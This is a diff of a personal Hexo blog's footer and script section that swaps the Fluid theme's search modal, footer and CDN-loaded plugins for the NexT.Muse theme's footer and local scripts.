-      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
-        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
-      </a>
-    
-
-    
-      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
-     aria-hidden="true">
-  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
-    <div class="modal-content">
-      <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
-        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
-          <span aria-hidden="true">&times;</span>
-        </button>
       </div>
-      <div class="modal-body mx-3">
-        <div class="md-form mb-5">
-          <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
-        </div>
-        <div class="list-group" id="local-search-result"></div>
-      </div>
-    </div>
-  </div>
-</div>
+    </main>
 
-    
+    <footer class="footer">
+      <div class="footer-inner">
+        
 
-    
-  </main>
+        
 
-  <footer>
-    <div class="footer-inner">
+<div class="copyright">
   
-  
-  
-    <!-- 备案信息 ICP for China -->
-    <div class="beian">
-  <span>
-    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
-      浙ICP备2022029346号
-    </a>
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
   </span>
-  
+  <span class="author" itemprop="copyrightHolder">So1Lupus</span>
 </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
 
   
-  
-</div>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
 
-  </footer>
+<script src="/js/utils.js"></script>
 
-  <!-- Scripts -->
-  
-  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
-  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
-
-  <script>
-    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
-    NProgress.start()
-    window.addEventListener('load', function() {
-      NProgress.done();
-    })
-  </script>
+<script src="/js/motion.js"></script>
 
 
-<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
-<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
-<script  src="/js/events.js" ></script>
-<script  src="/js/plugins.js" ></script>
+<script src="/js/schemes/muse.js"></script>
 
 
-  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
-  <script>
-    (function (window, document) {
-      var typing = Fluid.plugins.typing;
-      var subtitle = document.getElementById('subtitle');
-      if (!subtitle || !typing) {
-        return;
-      }
-      var text = subtitle.getAttribute('data-typed-text');
-      
-        typing(text);
-      
-    })(window, document);
-  </script>
+<script src="/js/next-boot.js"></script>
 
 
 
 
   
-    <script  src="/js/img-lazyload.js" ></script>
-  
-
-
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
-    var toc = jQuery('#toc');
-    if (toc.length === 0 || !window.tocbot) { return; }
-    var boardCtn = jQuery('#board-ctn');
-    var boardTop = boardCtn.offset().top;
-
-    window.tocbot.init(Object.assign({
-      tocSelector     : '#toc-body',
-      contentSelector : '.markdown-body',
-      linkClass       : 'tocbot-link',
-      activeLinkClass : 'tocbot-active-link',
-      listClass       : 'tocbot-list',
-      isCollapsedClass: 'tocbot-is-collapsed',
-      collapsibleClass: 'tocbot-is-collapsible',
-      scrollSmooth    : true,
-      includeTitleTags: true,
-      headingsOffset  : -boardTop,
-    }, CONFIG.toc));
-    if (toc.find('.toc-list-item').length > 0) {
-      toc.css('visibility', 'visible');
-    }
-
-    Fluid.events.registerRefreshCallback(function() {
-      if ('tocbot' in window) {
-        tocbot.refresh();
-        var toc = jQuery('#toc');
-        if (toc.length === 0 || !tocbot) {
-          return;
-        }
-        if (toc.find('.toc-list-item').length > 0) {
-          toc.css('visibility', 'visible');
-        }
-      }
-    });
-  });
-</script>
-
-
-  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
-
-  <script>Fluid.plugins.codeWidget();</script>
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
-    window.anchors.options = {
-      placement: CONFIG.anchorjs.placement,
-      visible  : CONFIG.anchorjs.visible
-    };
-    if (CONFIG.anchorjs.icon) {
-      window.anchors.options.icon = CONFIG.anchorjs.icon;
-    }
-    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
-    var res = [];
-    for (var item of el) {
-      res.push('.markdown-body > ' + item.trim());
-    }
-    if (CONFIG.anchorjs.placement === 'left') {
-      window.anchors.options.class = 'anchorjs-link-left';
-    }
-    window.anchors.add(res.join(', '));
-
-    Fluid.events.registerRefreshCallback(function() {
-      if ('anchors' in window) {
-        anchors.removeAll();
-        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
-        var res = [];
-        for (var item of el) {
-          res.push('.markdown-body > ' + item.trim());
-        }
-        if (CONFIG.anchorjs.placement === 'left') {
-          anchors.options.class = 'anchorjs-link-left';
-        }
-        anchors.add(res.join(', '));
-      }
-    });
-  });
-</script>
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
-    Fluid.plugins.fancyBox();
-  });
-</script>
-
-
-  <script>Fluid.plugins.imageCaption();</script>
-
-  <script  src="/js/local-search.js" ></script>
 
 
 
 
 
-<!-- 主题的启动项，将它保持在最底部 -->
-<!-- the boot of the theme, keep it at the bottom -->
-<script  src="/js/boot.js" ></script>
+
+
+
+
+
+
+
+
 
 
   
 
-  <noscript>
-    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
-  </noscript>
+  
+
 </body>
 </html>
